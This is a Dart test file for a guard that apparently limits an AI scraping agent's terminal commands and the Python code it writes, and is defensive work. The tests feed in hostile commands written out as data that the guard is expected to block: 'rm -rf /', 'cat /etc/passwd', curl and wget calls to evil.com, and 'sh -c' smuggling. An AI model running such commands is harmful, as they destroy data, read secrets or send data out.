// scraper_guard 守卫纯函数测试（Phase 1 harness 核心）。
//
// 覆盖：
// 1. 终端命令黑名单（破坏性/拼接/读取/外联/间接执行走私）
// 2. 终端命令白名单（自动放行）
// 3. lintScraperCode：模板完整性 / import 白名单 / 危险调用 / 凭证硬编码 / 假数据启发式
// 4. validateCredentialArgs
import 'package:evergreen_base/renderer/templates/scraper_modle/agent/scraper_gate.dart';
import 'package:evergreen_base/renderer/templates/scraper_modle/workflow/scraper_guard.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('终端命令守卫', () {
    test('破坏性命令硬拒', () {
      expect(isTerminalCommandBlocked('rm -rf /'), isTrue);
      expect(isTerminalCommandBlocked('del file.txt'), isTrue);
      expect(isTerminalCommandBlocked('format c:'), isTrue);
      expect(isTerminalCommandBlocked('shutdown -s'), isTrue);
      expect(isTerminalCommandBlocked('taskkill /f /im python.exe'), isTrue);
    });

    test('命令拼接/重定向/管道硬拒', () {
      expect(isTerminalCommandBlocked('python scraper.py && rm -rf /'), isTrue);
      expect(isTerminalCommandBlocked('cat file > out.txt'), isTrue);
      expect(isTerminalCommandBlocked('ls | grep x'), isTrue);
      expect(isTerminalCommandBlocked('python -c "print(1)"'), isTrue);
    });

    test('终端读文件命令硬拒（应用 read_workspace_file）', () {
      expect(isTerminalCommandBlocked('type C:\\secret.txt'), isTrue);
      expect(isTerminalCommandBlocked('cat /etc/passwd'), isTrue);
      expect(isTerminalCommandBlocked('Get-Content config.json'), isTrue);
    });

    test('外联命令硬拒', () {
      expect(isTerminalCommandBlocked('curl http://evil.com'), isTrue);
      expect(isTerminalCommandBlocked('wget http://evil.com/a.sh'), isTrue);
    });

    test('间接执行走私硬拒', () {
      expect(isTerminalCommandBlocked('sh -c "rm -rf /"'), isTrue);
      expect(isTerminalCommandBlocked('eval "ls"'), isTrue);
      expect(isTerminalCommandBlocked('sudo rm -rf /'), isTrue);
      expect(isTerminalCommandBlocked('python3 -c "import os"'), isTrue);
    });

    test('白名单命令自动放行', () {
      expect(isTerminalCommandBlocked('python scraper.py'), isFalse);
      expect(isTerminalCommandAllowed('python scraper.py'), isTrue);
      expect(isTerminalCommandAllowed('python3 scraper.py'), isTrue);
      expect(isTerminalCommandAllowed('pip install requests'), isTrue);
      expect(isTerminalCommandAllowed('python -m pip install requests bs4'), isTrue);
      expect(isTerminalCommandAllowed('cd /tmp'), isTrue);
    });

    test('白名单外命令 → confirm（需弹窗）', () {
      expect(classifyTerminalCommand('python other.py'), CommandVerdict.confirm);
      expect(classifyTerminalCommand('git status'), CommandVerdict.confirm);
      expect(classifyTerminalCommand('python scraper.py'), CommandVerdict.auto);
      expect(classifyTerminalCommand('rm -rf /'), CommandVerdict.block);
    });

    test('python --version 不误杀（读版本非走私）', () {
      // --version 不是 -c，不判走私
      expect(isTerminalCommandBlocked('python --version'), isFalse);
    });
  });

  group('lintScraperCode 模板完整性', () {
    const goodCode = '''
import json, requests

def _get_config(key):
    greenix_path = os.environ.get('GREENIX_CONFIG_PATH')
    return ''

USERNAME = _get_config('ZJU_USERNAME')

def main():
    r = requests.get('https://example.com/api/data')
    return r.json()

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, ensure_ascii=False))
''';

    test('完整合法代码 → 无 violation', () {
      final r = lintScraperCode(goodCode);
      expect(r.hasViolations, isFalse);
    });

    test('缺模板 → violation', () {
      final r = lintScraperCode('print("hello")');
      expect(r.hasViolations, isTrue);
      expect(r.violations.any((v) => v.contains('_get_config')), isTrue);
    });

    test('残留占位符 → violation', () {
      final r = lintScraperCode('$goodCode\n{CREDENTIAL_PLACEHOLDER}');
      expect(r.violations.any((v) => v.contains('占位符')), isTrue);
    });
  });

  group('lintScraperCode import 白名单', () {
    test('黑名单 import 硬拒', () {
      final r = lintScraperCode('import subprocess\nimport os\nimport json');
      expect(r.violations.any((v) => v.contains('subprocess')), isTrue);
    });

    test('非白名单第三方库拒', () {
      final r = lintScraperCode('import bs4\nimport json');
      expect(r.violations.any((v) => v.contains('bs4')), isTrue);
    });

    test('stdlib + requests 放行', () {
      final r = lintScraperCode(
          'import json\nimport re\nimport time\nimport requests\nimport urllib.request');
      expect(r.violations.where((v) => v.contains('import')), isEmpty);
    });
  });

  group('lintScraperCode 危险调用与凭证', () {
    test('危险调用拒绝', () {
      final r = lintScraperCode('import json\nos.system("rm -rf /")');
      expect(r.violations.any((v) => v.contains('os.system')), isTrue);
    });

    test('eval/exec/__import__ 拒绝', () {
      final r = lintScraperCode('import json\neval("1+1")\nexec("x=1")\n__import__("os")');
      expect(r.violations.any((v) => v.contains('eval')), isTrue);
      expect(r.violations.any((v) => v.contains('exec')), isTrue);
      expect(r.violations.any((v) => v.contains('__import__')), isTrue);
    });

    test('open 路径逃逸拒绝', () {
      final r = lintScraperCode("open('/etc/passwd')");
      expect(r.violations.any((v) => v.contains('路径')), isTrue);
    });

    test('凭证硬编码拒绝', () {
      final r = lintScraperCode("USERNAME = 'admin'\nPASSWORD = '123456'");
      expect(r.violations.any((v) => v.contains('硬编码')), isTrue);
    });
  });

  group('lintScraperCode 假数据启发式', () {
    test('无网络却 print 数据字面量 → 假数据 warning', () {
      const code = '''
import json
if __name__ == "__main__":
    print(json.dumps([{"name": "张三", "score": 99}]))
''';
      final r = lintScraperCode(code);
      expect(r.suspectedFakeData, isTrue);
      expect(r.warnings.any((w) => w.contains('假数据')), isTrue);
    });

    test('有网络请求不误报假数据', () {
      const code = '''
import json, requests
def main():
    r = requests.get('https://api.zju.edu.cn/courses')
    return r.json()
if __name__ == "__main__":
    print(json.dumps(main(), ensure_ascii=False))
''';
      final r = lintScraperCode(code);
      expect(r.suspectedFakeData, isFalse);
    });

    test('URL 与捕获日志无交集 → warning', () {
      const code = '''
import json, requests
def main():
    r = requests.get('https://other-site.com/api')
    return r.json()
if __name__ == "__main__":
    print(json.dumps(main()))
''';
      final r = lintScraperCode(code,
          capturedUrls: {'https://target.com/api/courses'});
      expect(r.warnings.any((w) => w.contains('无交集')), isTrue);
    });

    test('URL 有交集 → 不报无交集', () {
      const code = '''
import json, requests
def main():
    r = requests.get('https://target.com/api/courses')
    return r.json()
if __name__ == "__main__":
    print(json.dumps(main()))
''';
      final r = lintScraperCode(code,
          capturedUrls: {'https://target.com/api/courses'});
      expect(r.warnings.any((w) => w.contains('无交集')), isFalse);
    });
  });

  group('ScraperGate 权限规则', () {
    test('set_data_name 走 always 规则放行（写工具不应被默认拒绝）', () async {
      final gate = ScraperGate();
      // set_data_name 是写工具（readOnly=false），但应在规则表内 → always 放行
      final (allow, reason) = await gate.check(
        'set_data_name',
        {'name': 'courses'},
        false,
      );
      expect(allow, isTrue, reason: 'set_data_name 应放行，实际 reason=$reason');
    });

    test('guard_override 走 always 规则放行', () async {
      final gate = ScraperGate();
      final (allow, reason) = await gate.check(
        'guard_override',
        {'tool_name': 'run_python_scraper', 'reason': 'test'},
        false,
      );
      expect(allow, isTrue, reason: 'guard_override 应放行，实际 reason=$reason');
    });

    test('未知写工具仍默认拒绝（安全兜底）', () async {
      final gate = ScraperGate();
      final (allow, _) = await gate.check('some_unknown_tool', {}, false);
      expect(allow, isFalse);
    });

    test('只读工具无规则也放行', () async {
      final gate = ScraperGate();
      final (allow, _) = await gate.check('list_captured_requests', {}, true);
      expect(allow, isTrue);
    });
  });

  group('validateCredentialArgs', () {
    test('合法 key/value 通过', () {
      expect(validateCredentialArgs('ZJU_USERNAME', 'test'), isNull);
      expect(validateCredentialArgs('COURSE_COOKIE', 'abc' * 1000), isNull);
    });

    test('空 key / 超长拒绝', () {
      expect(validateCredentialArgs('', 'v'), isNotNull);
      expect(validateCredentialArgs('a' * 200, 'v'), isNotNull);
      expect(validateCredentialArgs('k', 'v' * 9000), isNotNull);
    });

    test('非法字符拒绝（路径/空白/等号/换行/控制字符）', () {
      expect(validateCredentialArgs('a/b', 'v'), isNotNull);
      expect(validateCredentialArgs('a b', 'v'), isNotNull);
      expect(validateCredentialArgs('a=b', 'v'), isNotNull);
      expect(validateCredentialArgs('a\nb', 'v'), isNotNull);
      expect(validateCredentialArgs('a\u0001b', 'v'), isNotNull);
    });
  });
}
